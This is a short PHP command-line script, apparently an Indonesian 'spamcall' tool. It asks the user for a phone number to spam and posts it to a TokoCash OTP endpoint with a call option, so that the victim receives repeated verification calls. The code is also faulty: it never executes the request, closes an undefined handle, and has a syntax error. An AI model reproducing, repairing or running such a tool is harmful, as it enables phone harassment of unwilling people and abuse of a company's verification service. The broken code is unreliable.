<?php
function send($phone){
       $ch = curl_init();
       curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");
       curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
       curl_setopt($ch, CURLOPT_HEADER, true);
       curl_setopt($ch, CURLOPT_POST, 1);
       curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");
       curl_close($sh);
       
}
echo "
========================================
SPAMCALL BY YUKAMAST[!]
INSTAGRAM => rizkiswee
CONTOH PENGGUNAAN ==>081234567654
========================================\n";
echo "MASUKKAN NOMER YANG AKAN DI SPAM[!]\nNOMER => ";
$nomer = trim(fgets(STDIN));
$execute = send($nomer)
print $execute;
?>
